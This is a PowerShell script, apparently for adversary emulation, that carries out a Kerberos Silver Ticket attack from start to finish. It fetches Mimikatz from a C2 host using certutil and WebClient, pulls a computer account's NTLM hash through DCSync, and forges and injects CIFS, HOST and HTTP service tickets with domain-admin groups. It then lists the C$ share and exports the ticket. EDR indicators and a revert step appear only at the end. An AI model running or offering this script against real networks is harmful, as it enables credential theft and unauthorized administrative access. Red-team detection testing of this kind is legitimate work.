$ErrorActionPreference = "SilentlyContinue"
$C2Host = if ($env:C2_HOST) { $env:C2_HOST } else { "127.0.0.1" }
$TargetIP = if ($env:TARGET_IP) { $env:TARGET_IP } else { "192.168.1.10" }

# Input parameters
$ServiceHash = if ($env:SERVICE_HASH) { $env:SERVICE_HASH } else { "" }

Write-Host "[*] Starting Identity Attack - Silver Ticket (Mimikatz kerberos::golden /service)..." -ForegroundColor Cyan

# T1558.002 - Steal or Forge Kerberos Tickets: Silver Ticket
# Forges a TGS for a specific service using the service account's NTLM hash
# More stealthy than Golden Ticket — never contacts the KDC
# Requires: Service account NTLM hash, Domain SID

Write-Host "[!] Requires: Service account NTLM hash, Target hostname" -ForegroundColor Yellow
Write-Host "[!] Target: $TargetIP" -ForegroundColor Yellow

$stagingDir = "C:\temp\staging"
New-Item -ItemType Directory -Path $stagingDir -Force | Out-Null
$mimikatzPath = "$stagingDir\mimikatz.exe"

# Step 1: Gather domain info
Write-Host "`n[*] Gathering domain information..." -ForegroundColor Yellow

try {
    $domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
    $domainName = $domain.Name
    Write-Host "[+] Domain: $domainName" -ForegroundColor Green
} catch {
    $domainName = $env:USERDNSDOMAIN
    if (-not $domainName) { $domainName = "YOURDOMAIN.LOCAL" }
    Write-Host "[*] Domain: $domainName" -ForegroundColor Yellow
}

# Get Domain SID
try {
    $whoamiSID = (whoami /user /fo csv | ConvertFrom-Csv).SID
    $domainSID = $whoamiSID -replace "-\d+$", ""
    Write-Host "[+] Domain SID: $domainSID" -ForegroundColor Green
} catch {
    Write-Host "[-] Could not determine Domain SID" -ForegroundColor Red
}

# Step 2: Enumerate service accounts for targeting
Write-Host "`n[*] [T1087.002] Enumerating computer account for target: $TargetIP..." -ForegroundColor Yellow
Write-Host "    CMD: nslookup $TargetIP"
$targetHostname = (nslookup $TargetIP 2>&1 | Select-String "Name:" | ForEach-Object { ($_ -split ":\s+")[1] })
if ($targetHostname) {
    Write-Host "[+] Resolved hostname: $targetHostname" -ForegroundColor Green
} else {
    $targetHostname = $TargetIP
    Write-Host "[*] Using IP as target: $targetHostname" -ForegroundColor Yellow
}

# Step 3: Download Mimikatz
Write-Host "`n[*] [T1105] Downloading Mimikatz..." -ForegroundColor Yellow
certutil -urlcache -split -f "http://$C2Host/tools/mimikatz.exe" $mimikatzPath

if (-not (Test-Path $mimikatzPath)) {
    try {
        (New-Object System.Net.WebClient).DownloadFile("http://$C2Host/tools/mimikatz.exe", $mimikatzPath)
    } catch { Write-Host "[-] Download failed." -ForegroundColor Red }
}

if (Test-Path $mimikatzPath) {
    Write-Host "[+] Mimikatz staged successfully" -ForegroundColor Green

    if (-not $ServiceHash) {
        # Try to extract computer account hash via DCSync
        Write-Host "`n[*] No service hash provided. Attempting to extract target computer account hash..." -ForegroundColor Yellow
        $computerAccount = ($targetHostname -split "\.")[0] + "$"
        Write-Host "    CMD: mimikatz.exe `"lsadump::dcsync /user:$computerAccount`" `"exit`""
        $dcsyncOut = & $mimikatzPath "privilege::debug" "lsadump::dcsync /user:$computerAccount" "exit" 2>&1
        $dcsyncOut | ForEach-Object { Write-Host $_ }

        $hashMatch = $dcsyncOut | Select-String "Hash NTLM:\s+([a-fA-F0-9]{32})"
        if ($hashMatch) {
            $ServiceHash = $hashMatch.Matches[0].Groups[1].Value
            Write-Host "[+] Extracted NTLM hash: $ServiceHash" -ForegroundColor Green
        } else {
            Write-Host "[-] Could not extract hash. Provide it via input parameter." -ForegroundColor Red
        }
    }

    if ($ServiceHash) {
        $spoofUser = "SilverAdmin"

        # Step 4a: Silver Ticket for CIFS (file share access)
        Write-Host "`n[*] [T1558.002] Forging Silver Ticket for CIFS service..." -ForegroundColor Yellow
        $silverCIFS = "kerberos::golden /user:$spoofUser /domain:$domainName /sid:$domainSID /target:$targetHostname /service:cifs /rc4:$ServiceHash /id:500 /groups:512,513 /ptt"
        Write-Host "    CMD: mimikatz.exe `"$silverCIFS`" `"exit`""
        & $mimikatzPath "privilege::debug" $silverCIFS "exit" 2>&1

        Write-Host "`n[*] Testing CIFS access with Silver Ticket..." -ForegroundColor Yellow
        Write-Host "    CMD: dir \\$targetHostname\C$"
        dir "\\$targetHostname\C$" 2>&1

        # Step 4b: Silver Ticket for HOST (scheduled tasks, WMI)
        Write-Host "`n[*] [T1558.002] Forging Silver Ticket for HOST service..." -ForegroundColor Yellow
        $silverHOST = "kerberos::golden /user:$spoofUser /domain:$domainName /sid:$domainSID /target:$targetHostname /service:host /rc4:$ServiceHash /id:500 /groups:512,513 /ptt"
        Write-Host "    CMD: mimikatz.exe `"$silverHOST`" `"exit`""
        & $mimikatzPath "privilege::debug" $silverHOST "exit" 2>&1

        # Step 4c: Silver Ticket for HTTP (web services)
        Write-Host "`n[*] [T1558.002] Forging Silver Ticket for HTTP service..." -ForegroundColor Yellow
        $silverHTTP = "kerberos::golden /user:$spoofUser /domain:$domainName /sid:$domainSID /target:$targetHostname /service:http /rc4:$ServiceHash /id:500 /groups:512,513 /ptt"
        & $mimikatzPath "privilege::debug" $silverHTTP "exit" 2>&1

        # Step 5: Verify cached tickets
        Write-Host "`n[*] Verifying injected Silver Tickets..." -ForegroundColor Yellow
        Write-Host "    CMD: klist"
        klist 2>&1

        # Export ticket
        $ticketFile = "$stagingDir\silver_ticket_cifs.kirbi"
        $exportCmd = "kerberos::golden /user:$spoofUser /domain:$domainName /sid:$domainSID /target:$targetHostname /service:cifs /rc4:$ServiceHash /id:500 /ticket:$ticketFile"
        & $mimikatzPath $exportCmd "exit" 2>&1

        if (Test-Path $ticketFile) {
            Write-Host "[+] Silver Ticket exported: $ticketFile" -ForegroundColor Green
        }
    }
} else {
    Write-Host "[-] Cannot execute - Mimikatz not available" -ForegroundColor Red
    Write-Host "[!] Ensure http://$C2Host/tools/mimikatz.exe is accessible" -ForegroundColor Yellow
}

Write-Host "`n[+] Silver Ticket Attack Complete." -ForegroundColor Green
Write-Host "[!] Check EDR for: TGS without prior TGT, service access anomalies, no 4769 on DC" -ForegroundColor Yellow
Write-Host "[!] Key Indicator: Service ticket presented without corresponding TGT request (no 4768)" -ForegroundColor Yellow
Write-Host "[!] Revert: klist purge to remove forged tickets" -ForegroundColor Yellow
